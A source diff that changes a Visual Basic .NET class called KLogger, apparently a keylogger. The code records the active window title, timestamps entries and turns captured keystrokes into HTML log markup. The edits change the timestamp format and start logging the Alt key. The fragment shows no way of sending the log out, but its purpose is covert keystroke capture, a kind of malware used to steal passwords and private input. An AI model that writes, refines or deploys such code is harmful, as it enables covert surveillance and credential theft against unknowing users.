@@ -54,7 +54,7 @@ Public Class KLogger
             Else
                 LastAV = o.ToInt32
                 LastAS = p.MainWindowTitle.ToString
-                Return "<br><br><b>[" & LastAS & "]" & HM() & "</b><br>"
+                Return "<br><br><b>[" & LastAS & "] " & HM() & "</b><br>"
             End If
         Catch ex As Exception
             Return ""
@@ -62,7 +62,7 @@ Public Class KLogger
     End Function
     Private Function HM() As String
         Dim oo = My.Computer.Clock.LocalTime
-        Return " " & oo.Hour & ":" & oo.Minute & ":" & oo.Second & " " & oo.Day & "/" & oo.Month & "/" & oo.Year
+        Return oo.Year & "/" & oo.Month & "/" & oo.Day & " " & New String(oo.Hour.ToString).PadLeft(2, "0") & ":" & New String(oo.Minute.ToString).PadLeft(2, "0") & ":" & New String(oo.Second.ToString).PadLeft(2, "0")
     End Function
     Private Sub WRK()
         isRunning = True
@@ -138,9 +138,9 @@ Public Class KLogger
         End If
         Try
             Select Case k
-                Case Keys.F1, Keys.F2, Keys.F3, Keys.F4, Keys.F5, Keys.F6, Keys.F7, Keys.F8, Keys.F9, Keys.F10, Keys.F11, Keys.F12, Keys.End, Keys.Delete, Keys.Back
+                Case Keys.F1, Keys.F2, Keys.F3, Keys.F4, Keys.F5, Keys.F6, Keys.F7, Keys.F8, Keys.F9, Keys.F10, Keys.F11, Keys.F12, Keys.End, Keys.Delete, Keys.Back, Keys.Alt
                     Return "<span class=""f"">[" & k.ToString & "]</span>"
-                Case Keys.LShiftKey, Keys.RShiftKey, Keys.Shift, Keys.ShiftKey, Keys.Control, Keys.ControlKey, Keys.RControlKey, Keys.LControlKey, Keys.Alt
+                Case Keys.LShiftKey, Keys.RShiftKey, Keys.Shift, Keys.ShiftKey, Keys.Control, Keys.ControlKey, Keys.RControlKey, Keys.LControlKey
                     Return ""
                 Case Keys.Space
                     Return " "
